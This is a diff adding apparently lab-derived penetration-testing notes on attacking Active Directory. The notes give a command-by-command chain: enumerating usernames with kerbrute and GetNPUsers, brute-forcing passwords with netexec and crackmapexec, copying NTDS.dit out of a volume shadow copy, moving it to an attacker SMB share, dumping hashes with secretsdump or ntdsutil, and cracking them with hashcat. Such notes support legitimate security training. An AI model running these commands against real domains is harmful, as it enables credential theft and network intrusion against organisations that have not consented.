@@ -1,0 +1,55 @@
+ACTIVE DIRECTORY IS COMMON AND CRITICAL DIRECTORY SERVICE IN MODERN ENTERPRISE NETWORKS
+
+
+(!!! COPYING NTDS IS MORE INVOLVED, PLEASE CHECK THE STEPS BELOW IN SHADOW COPY TO COPY !!!)
+NTDS.dit FILE:
+can bit hit with a dictionary attack against AD accounts to dump hashes
+NTDS.dit file is stored at %systemroot%/ntds.
+
+
+
+ENUMERATING VALID USERNAMES W/ KERBRUTE:
+./kerbrute_linux_amd64 userenum --dc <target-ip> --domain <target-ip> usernames.txt
+or:
+python3 /usr/local/bin/GetNPUsers.py -dc-ip 10.129.113.116 inlanefreight.local/ -usersfile usernamelist.txt 
+
+
+
+Onces you have valid usernames, you can...
+LAUNCH (LOUD) BRUTE-FORCE ATTACK W/ NETEXEC:
+netexec smb <target-ip> -u <username> -p <wordlist.txt>
+or:
+crackmapexec smb <TARGET> -u users.txt -p password123 --continue-on-success
+
+============================
+
+TRYING TO GET NTDS.DIT FILE:
+(on target):
+
+check privileges:
+net localgroup
+
+check a specific user's acc privs:
+net user <username>
+(find one that has admin privileges)
+
+
+CREATING A SHADOW COPY OF C:
+(Volume Shadow Copy)
+vssadmin CREATE SHADOW /For=C:
+
+COPYING NTDS.DIT FROM THE VSS:
+C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+
+TRANSFERRING NTDS.DIT TO HOST:
+C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\ShareName
+
+EXTRACTING HASHES FROM NTDS.DIT ON HOST:
+impacket-secretsdump -ntds NTDS.dit -system system.save LOCAL
+(need ntds.dit and system.save)
+
+METHOD 2:
+netexec smb <target-ip> -u usernamee -p P@55w0rd! -M ntdsutil
+
+CRACKING THE HASH:
+sudo hashcat -m 1000 <hash> <wordlist>
